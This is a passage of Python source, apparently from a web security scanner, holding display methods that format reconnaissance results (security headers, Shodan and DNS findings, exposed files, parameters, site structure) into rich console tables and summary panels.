        self.console.print(table)
        
        # Add summary of technical findings
        tech_summary = self._generate_technical_summary()
        if tech_summary:
            tech_panel = Panel(
                tech_summary,
                title="[bold cyan]🔍 Technical Intelligence Summary[/bold cyan]",
                expand=False,
                border_style="cyan"
            )
            self.console.print(tech_panel)

    def _calculate_assessment_score(self) -> int:
        """Calculate a comprehensive assessment score based on gathered intelligence."""
        if not hasattr(self, 'site_info') or not self.site_info:
            return 0
        
        score = 0
        max_score = 100
        
        # HTTPS and encryption (20 points)
        https_enabled = self.site_info.get('protocol_security', {}).get('https_enabled', False)
        if https_enabled:
            score += 20
        
        # Security headers (15 points)
        security_headers = self.site_info.get('security_headers', {})
        if security_headers:
            present_headers = [k for k, v in security_headers.items() if v != 'Missing']
            total_headers = len(security_headers)
            if total_headers > 0:
                score += int((len(present_headers) / total_headers) * 15)
        
        # WAF protection (10 points)
        waf_detected = self.site_info.get('waf_detected', 'Not detected')
        if waf_detected != 'Not detected':
            score += 10
        
        # Technology stack identification (15 points)
        tech_identified = 0
        if self.site_info.get('programming_language', 'Unknown') != 'Unknown':
            tech_identified += 1
        if self.site_info.get('web_framework', 'Unknown') != 'Unknown':
            tech_identified += 1
        if self.site_info.get('database_hints', []):
            tech_identified += 1
        if self.site_info.get('application_server', 'Unknown') != 'Unknown':
            tech_identified += 1
        score += int((tech_identified / 4) * 15)
        
        # Reconnaissance coverage (20 points)
        recon_modules = ['directory_enum', 'subdomain_discovery', 'email_addresses', 'sensitive_files']
        recon_found = sum(1 for module in recon_modules if self.site_info.get(module, []))
        score += int((recon_found / len(recon_modules)) * 20)
        
        # Network and service discovery (10 points)
        open_ports = self.site_info.get('open_ports', [])
        if open_ports:
            score += 10
        
        # Additional intelligence (10 points)
        additional_intel = 0
        if self.site_info.get('js_frameworks', []):
            additional_intel += 1
        if self.site_info.get('css_frameworks', []):
            additional_intel += 1
        if self.site_info.get('api_endpoints', []):
            additional_intel += 1
        if self.site_info.get('cms_detected', 'Unknown') != 'Unknown':
            additional_intel += 1
        score += int((additional_intel / 4) * 10)
        
        return min(score, max_score)
    
    def _get_completion_status(self) -> str:
        """Get the completion status based on gathered intelligence."""
        if not hasattr(self, 'site_info') or not self.site_info:
            return "Incomplete"
        
        # Count successful intelligence gathering modules
        modules_completed = 0
        total_modules = 10  # Expected core modules
        
        # Core intelligence modules
        if self.site_info.get('server_headers'):
            modules_completed += 1
        if self.site_info.get('protocol_security'):
            modules_completed += 1
        if self.site_info.get('security_headers'):
            modules_completed += 1
        if self.site_info.get('programming_language', 'Unknown') != 'Unknown':
            modules_completed += 1
        if self.site_info.get('web_framework', 'Unknown') != 'Unknown':
            modules_completed += 1
        if self.site_info.get('directory_enum', []):
            modules_completed += 1
        if self.site_info.get('subdomain_discovery', []):
            modules_completed += 1
        if self.site_info.get('technology_fingerprint', {}):
            modules_completed += 1
        if self.site_info.get('open_ports', []):
            modules_completed += 1
        if self.site_info.get('waf_detected', 'Not detected') != 'Not detected':
            modules_completed += 1
        
        completion_percentage = (modules_completed / total_modules) * 100
        
        if completion_percentage >= 90:
            return "Complete"
        elif completion_percentage >= 70:
            return "Mostly Complete"
        elif completion_percentage >= 50:
            return "Partial"
        else:
            return "Incomplete"

    def _generate_technical_summary(self) -> str:
        """Generate a summary of technical intelligence findings."""
        if not hasattr(self, 'site_info') or not self.site_info:
            return ""
        
        summary_parts = []
        
        # Security posture assessment
        https_enabled = self.site_info.get('protocol_security', {}).get('https_enabled', False)
        waf_detected = self.site_info.get('waf_detected', 'Not detected')
        security_headers = self.site_info.get('security_headers', {})
        
        if not https_enabled:
            summary_parts.append("⚠️ [bold red]CRITICAL:[/bold red] No HTTPS encryption detected")
        
        if waf_detected == 'Not detected':
            summary_parts.append("⚠️ [bold yellow]WARNING:[/bold yellow] No Web Application Firewall detected")
        
        missing_headers = [k for k, v in security_headers.items() if v == 'Missing'] if security_headers else []
        if missing_headers:
            summary_parts.append(f"⚠️ [bold yellow]WARNING:[/bold yellow] {len(missing_headers)} security headers missing")
        
        # Technology stack summary
        programming_language = self.site_info.get('programming_language', 'Unknown')
        web_framework = self.site_info.get('web_framework', 'Unknown')
        cms_detected = self.site_info.get('technology_fingerprint', {}).get('cms_detected', 'Unknown')
        
        tech_stack = []
        if programming_language != 'Unknown':
            tech_stack.append(programming_language)
        if web_framework != 'Unknown':
            tech_stack.append(web_framework)
        if cms_detected != 'Unknown':
            tech_stack.append(cms_detected)
        
        if tech_stack:
            summary_parts.append(f"🔧 [bold blue]Tech Stack:[/bold blue] {' + '.join(tech_stack)}")
        
        # Reconnaissance findings
        sensitive_files = self.site_info.get('sensitive_files', [])
        if sensitive_files:
            summary_parts.append(f"🔍 [bold red]SENSITIVE FILES:[/bold red] {len(sensitive_files)} exposed files detected")
        
        open_ports = self.site_info.get('open_ports', [])
        if open_ports:
            summary_parts.append(f"🔌 [bold yellow]PORTS:[/bold yellow] {len(open_ports)} open ports discovered")
        
        if not summary_parts:
            summary_parts.append("✅ [bold green]Basic security measures appear to be in place[/bold green]")
        
        return '\n'.join(summary_parts)

    def _display_advanced_intelligence(self):
        """Display advanced reconnaissance intelligence from external sources."""
        if not hasattr(self, 'site_info') or not self.site_info:
            return
            
        # Check if we have any advanced intelligence data
        has_advanced_data = any(key in self.site_info for key in [
            'shodan_intelligence', 'whois_analysis', 'technology_analysis', 
            'historical_analysis', 'dns_intelligence', 'ssl_analysis', 
            'http_analysis', 'network_analysis'
        ])
        
        if not has_advanced_data:
            return
        
        # Create advanced intelligence table
        table = Table(title="🎯 Advanced Threat Intelligence & OSINT", show_header=True, header_style="bold magenta")
        table.add_column("Intelligence Source", style="bold cyan", min_width=20)
        table.add_column("Category", style="bold yellow", min_width=25)
        table.add_column("Key Findings", style="white", min_width=40)
        table.add_column("Risk Assessment", style="bold red", min_width=30)

        # Shodan Intelligence
        if 'shodan_intelligence' in self.site_info:
            shodan_data = self.site_info['shodan_intelligence']
            if 'error' not in shodan_data:
                # Organization & Infrastructure
                org = shodan_data.get('organization', 'Unknown')
                country = shodan_data.get('country', 'Unknown')
                isp = shodan_data.get('isp', 'Unknown')
                table.add_row(
                    "🔍 Shodan OSINT",
                    "Infrastructure Details",
                    f"Org: {org}\nCountry: {country}\nISP: {isp}",
                    "Infrastructure fingerprinting successful"
                )
                
                # Open Ports & Services
                open_ports = shodan_data.get('open_ports', [])
                services = shodan_data.get('services', [])
                if open_ports:
                    table.add_row(
                        "🔍 Shodan OSINT",
                        "Network Exposure",
                        f"Open Ports: {', '.join(map(str, open_ports[:5]))}\nServices: {', '.join(services[:3])}",
                        "HIGH: Multiple attack vectors available" if len(open_ports) > 3 else "MEDIUM: Limited exposure"
                    )
                
                # Known Vulnerabilities
                vulnerabilities = shodan_data.get('vulnerabilities', [])
                if vulnerabilities:
                    table.add_row(
                        "🔍 Shodan OSINT",
                        "Known Vulnerabilities",
                        f"{len(vulnerabilities)} CVE(s): {', '.join(vulnerabilities[:3])}",
                        "CRITICAL: Known vulnerabilities detected"
                    )

        # WHOIS Intelligence
        if 'whois_analysis' in self.site_info:
            whois_data = self.site_info['whois_analysis']
            if 'error' not in whois_data:
                domain_name = whois_data.get('domain_name', 'Unknown')
                registrar = whois_data.get('registrar', 'Unknown')
                creation_date = whois_data.get('creation_date', 'Unknown')
                table.add_row(
                    "📋 WHOIS Analysis",
                    "Domain Intelligence",
                    f"Domain: {domain_name}\nRegistrar: {registrar}\nCreated: {creation_date}",
                    "Domain intelligence gathered successfully"
                )

        # Technology Analysis
        if 'technology_analysis' in self.site_info:
            tech_data = self.site_info['technology_analysis']
            if 'error' not in tech_data:
                cms = tech_data.get('cms', [])
                frameworks = tech_data.get('javascript_frameworks', [])
                analytics = tech_data.get('analytics', [])
                if cms or frameworks or analytics:
                    tech_summary = []
                    if cms: tech_summary.append(f"CMS: {', '.join(cms[:2])}")
                    if frameworks: tech_summary.append(f"JS: {', '.join(frameworks[:2])}")
                    if analytics: tech_summary.append(f"Analytics: {', '.join(analytics[:2])}")
                    table.add_row(
                        "🔧 BuiltWith Analysis",
                        "Technology Stack",
                        '\n'.join(tech_summary),
                        "Technology fingerprinting successful"
                    )

        # Historical Analysis
        if 'historical_analysis' in self.site_info:
            wayback_data = self.site_info['historical_analysis']
            if 'error' not in wayback_data:
                total_snapshots = wayback_data.get('total_snapshots', 0)
                oldest = wayback_data.get('oldest_snapshot', 'Unknown')
                if total_snapshots > 0:
                    table.add_row(
                        "⏰ Wayback Machine",
                        "Historical Analysis",
                        f"Total Snapshots: {total_snapshots}\nOldest Archive: {oldest}",
                        "Historical data available for analysis"
                    )

        # DNS Intelligence
        if 'dns_intelligence' in self.site_info:
            dns_data = self.site_info['dns_intelligence']
            if 'error' not in dns_data:
                # DNS Records Summary
                record_types = [rt for rt, records in dns_data.items() if records and rt != 'zone_transfer']
                zone_transfer = dns_data.get('zone_transfer', 'Unknown')
                table.add_row(
                    "🌐 DNS Intelligence",
                    "DNS Configuration",
                    f"Record Types: {', '.join(record_types[:5])}\nZone Transfer: {zone_transfer}",
                    "CRITICAL: Zone transfer possible" if 'Possible' in zone_transfer else "DNS enumeration successful"
                )

        # SSL/TLS Analysis
        if 'ssl_analysis' in self.site_info:
            ssl_data = self.site_info['ssl_analysis']
            if 'error' not in ssl_data and 'certificate_info' in ssl_data:
                cert_info = ssl_data['certificate_info']
                issuer = cert_info.get('issuer', 'Unknown')
                key_size = cert_info.get('key_size', 'Unknown')
                table.add_row(
                    "🔒 SSL/TLS Analysis",
                    "Certificate Details",
                    f"Issuer: {issuer}\nKey Size: {key_size}",
                    "SSL/TLS configuration analyzed"
                )

        # HTTP Analysis
        if 'http_analysis' in self.site_info:
            http_data = self.site_info['http_analysis']
            if 'error' not in http_data:
                http_version = http_data.get('http_version', 'Unknown')
                security_headers = http_data.get('security_headers', {})
                missing_headers = [k for k, v in security_headers.items() if v == 'missing']
                table.add_row(
                    "🌐 HTTP Analysis",
                    "Protocol Security",
                    f"HTTP Version: {http_version}\nMissing Headers: {len(missing_headers)}",
                    "HIGH: Security headers missing" if missing_headers else "HTTP security analyzed"
                )

        # Network Analysis
        if 'network_analysis' in self.site_info:
            network_data = self.site_info['network_analysis']
            if 'error' not in network_data and 'icmp_response' in network_data:
                icmp_response = network_data.get('icmp_response', False)
                ttl = network_data.get('ttl', 'Unknown')
                table.add_row(
                    "📡 Network Analysis",
                    "Network Connectivity",
                    f"ICMP Response: {icmp_response}\nTTL: {ttl}",
                    "Network analysis completed"
                )

        # Display the advanced intelligence table
        if table.row_count > 0:
            self.console.print(table)
            
            # Advanced intelligence summary
            intel_summary = self._generate_advanced_intelligence_summary()
            if intel_summary:
                intel_panel = Panel(
                    intel_summary,
                    title="[bold magenta]🎯 Advanced Intelligence Summary[/bold magenta]",
                    expand=False,
                    border_style="magenta"
                )
                self.console.print(intel_panel)

    def _generate_advanced_intelligence_summary(self) -> str:
        """Generate summary of advanced intelligence findings."""
        if not hasattr(self, 'site_info') or not self.site_info:
            return ""
        
        summary_parts = []
        
        # Shodan analysis
        if 'shodan_intelligence' in self.site_info:
            shodan_data = self.site_info['shodan_intelligence']
            if 'vulnerabilities' in shodan_data and shodan_data['vulnerabilities']:
                summary_parts.append(f"🚨 [bold red]CRITICAL:[/bold red] {len(shodan_data['vulnerabilities'])} known CVEs discovered via Shodan")
            if 'open_ports' in shodan_data and len(shodan_data['open_ports']) > 5:
                summary_parts.append(f"⚠️ [bold yellow]HIGH RISK:[/bold yellow] {len(shodan_data['open_ports'])} open ports detected")
        
        # DNS vulnerabilities
        if 'dns_intelligence' in self.site_info:
            dns_data = self.site_info['dns_intelligence']
            zone_transfer = dns_data.get('zone_transfer', '')
            if 'Possible' in zone_transfer:
                summary_parts.append("🚨 [bold red]CRITICAL:[/bold red] DNS zone transfer vulnerability detected")
        
        # SSL/TLS issues
        if 'ssl_analysis' in self.site_info:
            ssl_data = self.site_info['ssl_analysis']
            if 'vulnerabilities' in ssl_data and ssl_data['vulnerabilities']:
                summary_parts.append(f"⚠️ [bold yellow]SSL/TLS ISSUES:[/bold yellow] {len(ssl_data['vulnerabilities'])} SSL vulnerabilities found")
        
        # HTTP security
        if 'http_analysis' in self.site_info:
            http_data = self.site_info['http_analysis']
            security_headers = http_data.get('security_headers', {})
            missing_headers = [k for k, v in security_headers.items() if v == 'missing']
            if len(missing_headers) >= 4:
                summary_parts.append(f"⚠️ [bold yellow]SECURITY HEADERS:[/bold yellow] {len(missing_headers)} critical headers missing")
        
        # Technology risks
        if 'technology_analysis' in self.site_info:
            tech_data = self.site_info['technology_analysis']
            total_tech = sum(len(v) if isinstance(v, list) else 0 for v in tech_data.values())
            if total_tech > 10:
                summary_parts.append(f"ℹ️ [bold blue]INFO:[/bold blue] Extensive technology stack detected ({total_tech} components)")
        
        # Historical data
        if 'historical_analysis' in self.site_info:
            wayback_data = self.site_info['historical_analysis']
            snapshots = wayback_data.get('total_snapshots', 0)
            if snapshots > 50:
                summary_parts.append(f"ℹ️ [bold blue]HISTORICAL DATA:[/bold blue] {snapshots} archived snapshots available for analysis")
        
        if not summary_parts:
            summary_parts.append("✅ [bold green]Advanced reconnaissance completed successfully[/bold green]")
        
        return '\n'.join(summary_parts)

    def _display_comprehensive_discovery_analysis(self):
        """Display comprehensive discovery analysis including webpage count, file leaks, and advanced parameters"""
        if not hasattr(self, 'site_info') or not self.site_info:
            return
            
        # Check if we have discovery data
        has_discovery_data = any(key in self.site_info for key in [
            'webpage_discovery', 'file_leak_analysis', 'parameter_enumeration'
        ])
        
        if not has_discovery_data:
            return
        
        # Create comprehensive discovery table
        table = Table(title="🔍 Comprehensive Discovery & Security Analysis", show_header=True, header_style="bold green")
        table.add_column("Discovery Category", style="bold blue", min_width=25)
        table.add_column("Metric", style="bold yellow", min_width=20)
        table.add_column("Count/Details", style="white", min_width=15)
        table.add_column("Security Impact", style="bold red", min_width=35)
        table.add_column("Risk Level", style="bold magenta", min_width=12)

        # Webpage Discovery Analysis
        if 'webpage_discovery' in self.site_info:
            discovery_data = self.site_info['webpage_discovery']
            
            # Total Pages Discovered
            total_pages = discovery_data.get('total_pages', 0)
            table.add_row(
                "🌐 Website Discovery",
                "Total Pages Found",
                str(total_pages),
                "Expanded attack surface - more endpoints to test",
                "HIGH" if total_pages > 50 else "MEDIUM" if total_pages > 20 else "LOW"
            )
            
            # Hidden Directories
            hidden_dirs = discovery_data.get('hidden_directories', [])
            table.add_row(
                "🌐 Website Discovery",
                "Hidden Directories",
                str(len(hidden_dirs)),
                f"Potential unauthorized access points: {', '.join(hidden_dirs[:3])}" if hidden_dirs else "No hidden directories found",
                "HIGH" if len(hidden_dirs) > 5 else "MEDIUM" if hidden_dirs else "LOW"
            )
            
            # Admin Panels
            admin_panels = discovery_data.get('admin_panels', [])
            table.add_row(
                "🌐 Website Discovery",
                "Admin Panels",
                str(len(admin_panels)),
                f"Administrative interfaces exposed: {', '.join(admin_panels[:2])}" if admin_panels else "No admin panels detected",
                "CRITICAL" if admin_panels else "LOW"
            )
            
            # API Endpoints
            api_endpoints = discovery_data.get('api_endpoints', [])
            table.add_row(
                "🌐 Website Discovery",
                "API Endpoints",
                str(len(api_endpoints)),
                f"API attack surface: {', '.join(api_endpoints[:3])}" if api_endpoints else "No API endpoints found",
                "HIGH" if len(api_endpoints) > 10 else "MEDIUM" if api_endpoints else "LOW"
            )
            
            # Robots.txt Analysis
            robots_analysis = discovery_data.get('robots_txt_analysis', {})
            if robots_analysis.get('found'):
                disallowed_paths = robots_analysis.get('disallowed_paths', [])
                table.add_row(
                    "🌐 Website Discovery",
                    "Robots.txt Leaks",
                    str(len(disallowed_paths)),
                    f"Information disclosure via robots.txt: {', '.join(disallowed_paths[:3])}" if disallowed_paths else "Robots.txt found but no sensitive paths",
                    "MEDIUM" if disallowed_paths else "LOW"
                )

        # File Leak Analysis
        if 'file_leak_analysis' in self.site_info:
            leak_data = self.site_info['file_leak_analysis']
            
            # Total File Leaks
            total_leaks = leak_data.get('total_leaks', 0)
            table.add_row(
                "📁 File Leak Detection",
                "Total Sensitive Files",
                str(total_leaks),
                "Sensitive information exposure risk",
                "CRITICAL" if total_leaks > 10 else "HIGH" if total_leaks > 5 else "MEDIUM" if total_leaks > 0 else "LOW"
            )
            
            # Database Backups
            db_backups = leak_data.get('database_backups', [])
            table.add_row(
                "📁 File Leak Detection",
                "Database Backups",
                str(len(db_backups)),
                f"Critical data exposure: {', '.join(db_backups[:2])}" if db_backups else "No database backups exposed",
                "CRITICAL" if db_backups else "LOW"
            )
            
            # Source Code Leaks
            source_leaks = leak_data.get('source_code_leaks', [])
            table.add_row(
                "📁 File Leak Detection",
                "Source Code Leaks",
                str(len(source_leaks)),
                f"Application source exposure: {', '.join(source_leaks[:2])}" if source_leaks else "No source code exposed",
                "HIGH" if source_leaks else "LOW"
            )
            
            # Configuration Files
            config_leaks = leak_data.get('configuration_leaks', [])
            table.add_row(
                "📁 File Leak Detection",
                "Configuration Files",
                str(len(config_leaks)),
                f"System configuration exposure: {', '.join(config_leaks[:2])}" if config_leaks else "No configuration files exposed",
                "HIGH" if config_leaks else "LOW"
            )
            
            # Credential Files
            cred_files = leak_data.get('credential_files', [])
            table.add_row(
                "📁 File Leak Detection",
                "Credential Files",
                str(len(cred_files)),
                f"Authentication bypass risk: {', '.join(cred_files[:2])}" if cred_files else "No credential files found",
                "CRITICAL" if cred_files else "LOW"
            )
            
            # Log Files
            log_files = leak_data.get('log_files', [])
            table.add_row(
                "📁 File Leak Detection",
                "Log Files",
                str(len(log_files)),
                f"Information leakage via logs: {', '.join(log_files[:2])}" if log_files else "No log files exposed",
                "MEDIUM" if log_files else "LOW"
            )

        # Parameter Enumeration Analysis
        if 'parameter_enumeration' in self.site_info:
            param_data = self.site_info['parameter_enumeration']
            
            # Total Parameters
            total_params = param_data.get('total_parameters', 0)
            table.add_row(
                "🔧 Parameter Analysis",
                "Total Parameters",
                str(total_params),
                "Expanded input validation testing surface",
                "HIGH" if total_params > 20 else "MEDIUM" if total_params > 10 else "LOW"
            )
            
            # GET Parameters
            get_params = param_data.get('get_parameters', [])
            table.add_row(
                "🔧 Parameter Analysis",
                "GET Parameters",
                str(len(get_params)),
                f"URL-based attack vectors: {', '.join(get_params[:5])}" if get_params else "No GET parameters identified",
                "MEDIUM" if len(get_params) > 10 else "LOW"
            )
            
            # POST Parameters
            post_params = param_data.get('post_parameters', [])
            table.add_row(
                "🔧 Parameter Analysis",
                "POST Parameters",
                str(len(post_params)),
                f"Form-based attack vectors: {', '.join(post_params[:5])}" if post_params else "No POST parameters found",
                "MEDIUM" if len(post_params) > 10 else "LOW"
            )
            
            # Injectable Parameters
            injectable_params = param_data.get('injectable_parameters', [])
            table.add_row(
                "🔧 Parameter Analysis",
                "Injectable Parameters",
                str(len(injectable_params)),
                f"Potential injection vulnerabilities: {', '.join(injectable_params[:3])}" if injectable_params else "No injectable parameters detected",
                "CRITICAL" if injectable_params else "LOW"
            )
            
            # File Upload Parameters
            upload_params = param_data.get('file_upload_parameters', [])
            table.add_row(
                "🔧 Parameter Analysis",
                "File Upload Points",
                str(len(upload_params)),
                f"File upload attack vectors: {', '.join(upload_params[:3])}" if upload_params else "No file upload parameters",
                "HIGH" if upload_params else "LOW"
            )
            
            # Authentication Parameters
            auth_params = param_data.get('authentication_parameters', [])
            table.add_row(
                "🔧 Parameter Analysis",
                "Auth Parameters",
                str(len(auth_params)),
                f"Authentication bypass targets: {', '.join(auth_params[:3])}" if auth_params else "No authentication parameters",
                "HIGH" if auth_params else "LOW"
            )
            
            # Hidden Parameters
            hidden_params = param_data.get('hidden_parameters', [])
            table.add_row(
                "🔧 Parameter Analysis",
                "Hidden Parameters",
                str(len(hidden_params)),
                f"Concealed input vectors: {', '.join(hidden_params[:3])}" if hidden_params else "No hidden parameters found",
                "MEDIUM" if hidden_params else "LOW"
            )
            
            # API Parameters
            api_params = param_data.get('api_parameters', [])
            table.add_row(
                "🔧 Parameter Analysis",
                "API Parameters",
                str(len(api_params)),
                f"API exploitation vectors: {', '.join(api_params[:3])}" if api_params else "No API parameters identified",
                "HIGH" if len(api_params) > 5 else "MEDIUM" if api_params else "LOW"
            )

        # Display the comprehensive discovery table
        if table.row_count > 0:
            self.console.print(table)
            
            # Discovery analysis summary
            discovery_summary = self._generate_discovery_analysis_summary()
            if discovery_summary:
                discovery_panel = Panel(
                    discovery_summary,
                    title="[bold green]🔍 Discovery Analysis Summary[/bold green]",
                    expand=False,
                    border_style="green"
                )
                self.console.print(discovery_panel)

    def _generate_discovery_analysis_summary(self) -> str:
        """Generate summary of discovery analysis findings"""
        if not hasattr(self, 'site_info') or not self.site_info:
            return ""
        
        summary_parts = []
        
        # Webpage discovery summary
        if 'webpage_discovery' in self.site_info:
            discovery_data = self.site_info['webpage_discovery']
            total_pages = discovery_data.get('total_pages', 0)
            admin_panels = discovery_data.get('admin_panels', [])
            api_endpoints = discovery_data.get('api_endpoints', [])
            
            if total_pages > 100:
                summary_parts.append(f"🌐 [bold blue]EXTENSIVE DISCOVERY:[/bold blue] {total_pages} webpages discovered - large attack surface")
            elif total_pages > 50:
                summary_parts.append(f"🌐 [bold blue]SIGNIFICANT DISCOVERY:[/bold blue] {total_pages} webpages found")
            
            if admin_panels:
                summary_parts.append(f"🚨 [bold red]CRITICAL:[/bold red] {len(admin_panels)} admin panel(s) exposed")
            
            if len(api_endpoints) > 10:
                summary_parts.append(f"⚠️ [bold yellow]API EXPOSURE:[/bold yellow] {len(api_endpoints)} API endpoints discovered")
        
        # File leak summary
        if 'file_leak_analysis' in self.site_info:
            leak_data = self.site_info['file_leak_analysis']
            total_leaks = leak_data.get('total_leaks', 0)
            db_backups = leak_data.get('database_backups', [])
            cred_files = leak_data.get('credential_files', [])
            
            if total_leaks > 10:
                summary_parts.append(f"🚨 [bold red]CRITICAL LEAKAGE:[/bold red] {total_leaks} sensitive files exposed")
            elif total_leaks > 5:
                summary_parts.append(f"⚠️ [bold yellow]FILE EXPOSURE:[/bold yellow] {total_leaks} sensitive files found")
            
            if db_backups:
                summary_parts.append(f"🚨 [bold red]DATABASE EXPOSURE:[/bold red] {len(db_backups)} database backup(s) accessible")
            
            if cred_files:
                summary_parts.append(f"🚨 [bold red]CREDENTIAL EXPOSURE:[/bold red] {len(cred_files)} credential file(s) found")
        
        # Parameter analysis summary
        if 'parameter_enumeration' in self.site_info:
            param_data = self.site_info['parameter_enumeration']
            total_params = param_data.get('total_parameters', 0)
            injectable_params = param_data.get('injectable_parameters', [])
            upload_params = param_data.get('file_upload_parameters', [])
            
            if total_params > 50:
                summary_parts.append(f"🔧 [bold blue]COMPLEX APPLICATION:[/bold blue] {total_params} parameters discovered")
            
            if injectable_params:
                summary_parts.append(f"🚨 [bold red]INJECTION RISK:[/bold red] {len(injectable_params)} potentially injectable parameter(s)")
            
            if upload_params:
                summary_parts.append(f"⚠️ [bold yellow]UPLOAD RISK:[/bold yellow] {len(upload_params)} file upload vector(s) found")
        
        if not summary_parts:
            summary_parts.append("✅ [bold green]Comprehensive discovery analysis completed successfully[/bold green]")
        
        return '\n'.join(summary_parts)

    def _display_website_structure_analysis(self):
        """Display comprehensive website structure mapping analysis"""
        if not hasattr(self, 'site_info') or 'website_structure' not in self.site_info:
            return

        structure_data = self.site_info['website_structure']
        
        # Main structure analysis table
        table = Table(
            title="🗺️ Website Structure Mapping Analysis",
            show_header=True,
            header_style="bold magenta",
            border_style="blue",
            title_style="bold blue"
        )
        
        table.add_column("🎯 Category", style="cyan", width=20)
        table.add_column("📊 Metric", style="magenta", width=25)
        table.add_column("📈 Count", style="green", width=10)
        table.add_column("🔍 Details", style="white", width=50)
        table.add_column("⚠️ Risk Level", style="red", width=12)

        # Basic structure information
        discovered_urls = structure_data.get('discovered_urls', [])
        crawl_stats = structure_data.get('crawl_statistics', {})
        
        table.add_row(
            "🗺️ Site Mapping",
            "Total URLs Discovered",
            str(len(discovered_urls)),
            f"Complete site structure mapped with {crawl_stats.get('crawl_depth_achieved', 0)} levels deep",
            "HIGH" if len(discovered_urls) > 100 else "MEDIUM" if len(discovered_urls) > 30 else "LOW"
        )
        
        table.add_row(
            "🗺️ Site Mapping",
            "Unique Directories",
            str(crawl_stats.get('unique_directories', 0)),
            "Directory structure complexity and organization analysis",
            "MEDIUM" if crawl_stats.get('unique_directories', 0) > 10 else "LOW"
        )
        
        table.add_row(
            "🗺️ Site Mapping",
            "File Types Found",
            str(crawl_stats.get('file_types_discovered', 0)),
            "Technology diversity and potential attack vectors",
            "HIGH" if crawl_stats.get('file_types_discovered', 0) > 10 else "MEDIUM" if crawl_stats.get('file_types_discovered', 0) > 5 else "LOW"
        )
        
        table.add_row(
            "🗺️ Site Mapping",
            "Parameterized URLs",
            str(crawl_stats.get('parameters_found', 0)),
            "Dynamic content and potential injection points",
            "HIGH" if crawl_stats.get('parameters_found', 0) > 20 else "MEDIUM" if crawl_stats.get('parameters_found', 0) > 5 else "LOW"
        )

        # Robots.txt analysis
        robots_analysis = structure_data.get('robots_analysis', {})
        if robots_analysis.get('exists'):
            disallowed_paths = robots_analysis.get('disallowed_paths', [])
            interesting_findings = robots_analysis.get('interesting_findings', [])
            
            table.add_row(
                "🤖 Robots Analysis",
                "Disallowed Paths",
                str(len(disallowed_paths)),
                f"Hidden areas revealed: {', '.join(disallowed_paths[:3])}" if disallowed_paths else "Standard robots.txt configuration",
                "HIGH" if len(disallowed_paths) > 10 else "MEDIUM" if disallowed_paths else "LOW"
            )
            
            table.add_row(
                "🤖 Robots Analysis",
                "Sensitive Disclosures",
                str(len(interesting_findings)),
                f"Critical information leakage: {', '.join(interesting_findings[:2])}" if interesting_findings else "No sensitive path disclosures",
                "CRITICAL" if interesting_findings else "LOW"
            )
            
            user_agents = robots_analysis.get('user_agents', [])
            table.add_row(
                "🤖 Robots Analysis",
                "Targeted User Agents",
                str(len(user_agents)),
                f"Bot targeting rules: {', '.join(user_agents[:3])}" if user_agents else "Standard user agent handling",
                "MEDIUM" if len(user_agents) > 3 else "LOW"
            )

        # Sitemap analysis
        sitemap_analysis = structure_data.get('sitemap_analysis', {})
        sitemaps_found = sitemap_analysis.get('sitemaps_found', [])
        if sitemaps_found:
            table.add_row(
                "🗺️ Sitemap Discovery",
                "Sitemaps Found",
                str(len(sitemaps_found)),
                f"XML sitemaps discovered: {', '.join([s.split('/')[-1] for s in sitemaps_found[:3]])}",
                "MEDIUM" if len(sitemaps_found) > 2 else "LOW"
            )
            
            total_sitemap_urls = sitemap_analysis.get('total_urls', 0)
            table.add_row(
                "🗺️ Sitemap Discovery",
                "Sitemap URLs",
                str(total_sitemap_urls),
                "Additional URLs revealed through sitemaps",
                "HIGH" if total_sitemap_urls > 100 else "MEDIUM" if total_sitemap_urls > 20 else "LOW"
            )

        # Directory enumeration
        directory_enum = structure_data.get('directory_enumeration', {})
        existing_dirs = directory_enum.get('existing_directories', [])
        interesting_files = directory_enum.get('interesting_files', [])
        
        table.add_row(
            "📁 Directory Enum",
            "Accessible Directories",
            str(len(existing_dirs)),
            f"Discoverable directories: {', '.join([d['url'].split('/')[-2] for d in existing_dirs[:3]])}" if existing_dirs else "No common directories found",
            "HIGH" if len(existing_dirs) > 10 else "MEDIUM" if existing_dirs else "LOW"
        )
        
        table.add_row(
            "📁 Directory Enum",
            "Sensitive Files",
            str(len(interesting_files)),
            f"Critical file exposure: {', '.join([f['url'].split('/')[-1] for f in interesting_files[:3]])}" if interesting_files else "No sensitive files exposed",
            "CRITICAL" if any('config' in f['url'] or 'backup' in f['url'] for f in interesting_files) else "HIGH" if interesting_files else "LOW"
        )

        # Subdomain enumeration
        subdomain_enum = structure_data.get('subdomain_enumeration', {})
        discovered_subdomains = subdomain_enum.get('discovered_subdomains', [])
        interesting_subdomains = subdomain_enum.get('interesting_subdomains', [])
        
        table.add_row(
            "🌐 Subdomain Enum",
            "Subdomains Found",
            str(len(discovered_subdomains)),
            f"Additional attack surface: {', '.join(discovered_subdomains[:3])}" if discovered_subdomains else "No subdomains discovered",
            "HIGH" if len(discovered_subdomains) > 10 else "MEDIUM" if discovered_subdomains else "LOW"
        )
        
        table.add_row(
            "🌐 Subdomain Enum",
            "High-Risk Subdomains",
            str(len(interesting_subdomains)),
            f"Critical subdomains: {', '.join(interesting_subdomains[:3])}" if interesting_subdomains else "No high-risk subdomains",
            "CRITICAL" if any('admin' in sub or 'test' in sub for sub in interesting_subdomains) else "HIGH" if interesting_subdomains else "LOW"
        )

        # Structure analysis patterns
        structure_analysis = structure_data.get('structure_analysis', {})
        common_patterns = structure_analysis.get('common_patterns', [])
        
        if common_patterns:
            table.add_row(
                "🔍 Pattern Analysis",
                "Security Patterns",
                str(len(common_patterns)),
                f"Application insights: {', '.join(common_patterns[:2])}",
                "HIGH" if any('admin' in pattern.lower() for pattern in common_patterns) else "MEDIUM"
            )

        # Display the structure table
        if table.row_count > 0:
            self.console.print(table)
            
            # Structure analysis summary
            structure_summary = self._generate_structure_analysis_summary(structure_data)
            if structure_summary:
                structure_panel = Panel(
                    structure_summary,
                    title="[bold green]🗺️ Website Structure Analysis Summary[/bold green]",
                    expand=False,
                    border_style="green"
                )
                self.console.print(structure_panel)

    def _display_per_url_vulnerabilities(self):
        """Display per-URL vulnerability analysis"""
        if not hasattr(self, 'site_info') or 'website_structure' not in self.site_info:
            return

        structure_data = self.site_info['website_structure']
        per_url_data = structure_data.get('per_url_vulnerabilities', {})
        
        if not per_url_data:
            return

        # Per-URL vulnerability table
        table = Table(
            title="🎯 Per-URL Vulnerability Analysis",
            show_header=True,
            header_style="bold magenta",
            border_style="red",
            title_style="bold red"
        )
        
        table.add_column("🌐 URL", style="cyan", width=35)
